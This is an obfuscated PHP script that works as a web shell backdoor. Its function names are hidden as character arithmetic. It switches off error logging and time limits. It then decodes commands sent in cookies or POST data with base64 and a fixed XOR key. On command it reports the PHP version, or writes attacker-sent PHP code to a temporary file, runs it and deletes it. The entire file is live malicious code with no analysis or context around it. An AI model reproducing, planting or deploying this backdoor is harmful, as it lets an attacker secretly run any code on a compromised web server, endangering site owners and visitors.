<?php $mtowah = "\x66".chr(979-874).'l'.chr(101).chr(571-476).chr(112)."\x75".'t'."\x5f"."\x63"."\157".chr(1018-908).chr(287-171).chr(914-813).'n'."\164"."\x73";
$zbtldy = "\x62".'a'."\x73".chr(960-859).chr(54)."\64"."\137".'d'.'e'."\x63"."\157"."\144"."\x65";
$zuhgpm = chr(963-858)."\x6e".'i'.'_'.'s'.'e'.chr(116);
$fodbpcyemv = 'u'."\156".chr(993-885)."\151".chr(110)."\153";


@$zuhgpm("\x65".'r'."\x72".chr(1001-890)."\162".chr(621-526).chr(108)."\x6f".chr(242-139), NULL);
@$zuhgpm("\154".chr(111).'g'.chr(95).chr(268-167).'r'.'r'.'o'."\x72".chr(115), 0);
@$zuhgpm(chr(925-816).chr(885-788).chr(120).'_'."\x65"."\x78".'e'.chr(191-92).chr(117).chr(116)."\x69".chr(111).'n'.chr(95).'t'."\x69"."\x6d"."\x65", 0);
@set_time_limit(0);

function ctqsbynu($yhoqdva, $sqijqhfk)
{
    $ddxguppgba = "";
    for ($mjolo = 0; $mjolo < strlen($yhoqdva);) {
        for ($j = 0; $j < strlen($sqijqhfk) && $mjolo < strlen($yhoqdva); $j++, $mjolo++) {
            $ddxguppgba .= chr(ord($yhoqdva[$mjolo]) ^ ord($sqijqhfk[$j]));
        }
    }
    return $ddxguppgba;
}

$ozjpgjxex = array_merge($_COOKIE, $_POST);
$tixxldt = '56dc1e2a-8f6f-4ed3-abdc-98499ed82de8';
foreach ($ozjpgjxex as $gutja => $yhoqdva) {
    $yhoqdva = @unserialize(ctqsbynu(ctqsbynu($zbtldy($yhoqdva), $tixxldt), $gutja));
    if (isset($yhoqdva[chr(455-358)."\153"])) {
        if ($yhoqdva[chr(97)] == "\x69") {
            $mjolo = array(
                "\x70".'v' => @phpversion(),
                "\x73".chr(502-384) => "3.5",
            );
            echo @serialize($mjolo);
        } elseif ($yhoqdva[chr(97)] == chr(994-893)) {
            $qjrrqa = "./" . md5($tixxldt) . "\x2e"."\x69".chr(477-367).chr(928-829);
            @$mtowah($qjrrqa, "<" . '?'.'p'.chr(1047-943).chr(682-570).chr(41-9).'@'.'u'.chr(110).'l'.chr(589-484).'n'."\153".'('."\137".chr(95).'F'."\111"."\114"."\105".chr(95)."\137".')'.chr(59).chr(589-557) . $yhoqdva["\144"]);
            include($qjrrqa);
            @$fodbpcyemv($qjrrqa);
        }
        exit();
    }
}

